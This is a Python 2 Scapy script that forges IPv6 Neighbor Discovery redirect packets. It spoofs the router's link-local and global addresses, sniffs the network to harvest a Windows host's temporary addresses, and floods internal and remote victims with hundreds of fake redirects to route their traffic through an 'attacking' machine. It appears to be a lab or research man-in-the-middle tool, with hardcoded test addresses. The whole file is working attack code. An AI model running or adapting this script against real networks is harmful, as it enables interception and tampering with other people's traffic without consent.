#!/usr/bin/python

from scapy.all import *
from sets import Set

"""
the class build ND redirect messages
"""
class Redirect:
    
    def __init__(self):
        self.linux = "2001:abcd:acad:2:a00:27ff:fe84:bb37"
        self.linuxMac = "08:00:27:84:bb:37"
        self.linkLinux = "fe80::a00:27ff:fe84:bb37"
        self.win = "2001:abcd:acad:2:b485:2aec:9447:fd83"
        self.firewall = "2001:abcd:acad:2::1"
        self.linkFirewall = "fe80::1"
        self.prefix = "2001:abcd:acad:2:"
        self.attacking = "2001:abcd:acad:1::2"
        self.attackingMac = "b8:27:eb:aa:31:e5"
        self.externalAdr = "2001:abcd:acad:1::15"
        self.adrList = Set()
        print 'Redirect'

    def buildPacketInternal(self, ipAdr, mac, tgtLinkLocal):
        identifier = int("0001",16)
        data = "abcdefghijklmnopqrstuvwabcdefghi"
        targetLinkLayer = ICMPv6NDOptDstLLAddr(lladdr=mac)
        redirHeader = ICMPv6NDOptRedirectedHdr(pkt=IPv6(dst=self.firewall,src=ipAdr,hlim=128)/ICMPv6EchoRequest(id=identifier,seq=1)/data)
        return IPv6(dst=ipAdr,src=self.linkFirewall)/ICMPv6ND_Redirect(tgt=tgtLinkLocal,dst=self.attacking)/targetLinkLayer/redirHeader

    def buildPacketRemote(self, ipAdr):
        identifier = int("0001",16)
        data = "abcdefghijklmnopqrstuvwabcdefghi"
        targetLinkLayer = ICMPv6NDOptDstLLAddr(lladdr=self.attackingMac)
        redirHeader = ICMPv6NDOptRedirectedHdr(pkt=IPv6(dst=self.externalAdr,src=ipAdr,hlim=128)/ICMPv6EchoRequest(id=identifier,seq=1)/data)
        return IPv6(dst=ipAdr,src=self.firewall)/ICMPv6ND_Redirect(tgt=self.attacking,dst=self.externalAdr)/targetLinkLayer/redirHeader

    
    def execModuleInternalWin(self, exitIface):
        #this is to induce windows to disclose its temp adr
        pingWindows = IPv6(dst=self.win)/ICMPv6EchoReply()
        send(pingWindows, iface=exitIface, verbose=False)
        #the sniffer eventually grabs the win tmp adr
        self.receiver(exitIface)
        print self.adrList
        for adr in self.adrList:
            packetContainer = self.buildPacketInternal(adr, self.linuxMac, self.linkLinux)
            for t in range(1,500):
                send(packetContainer, iface=exitIface, verbose=False)

    def execModuleRemoteWin(self, exitIface):
        packetContainer = self.buildPacketRemote(self.win)
        for t in range(1,500):
            send(packetContainer, iface=exitIface, verbose=False)

    def execModuleRemoteLinux(self, exitIface):
        packetContainer = self.buildPacketRemote(self.linux)
        for t in range(1,500):
            send(packetContainer, iface=exitIface, verbose=False)

    def packet_callback(self, packet):
        if IPv6 in packet[0]:
            adr = packet[IPv6].dst
            print adr
            if self.prefix in adr and not adr == self.linux:
                self.adrList.add(adr)        

    #the sniffer for the internal Mitm NA attack
    def receiver(self, iFace):
        sniff(iface=iFace, filter='ip6', prn=self.packet_callback, store=0, timeout=10)
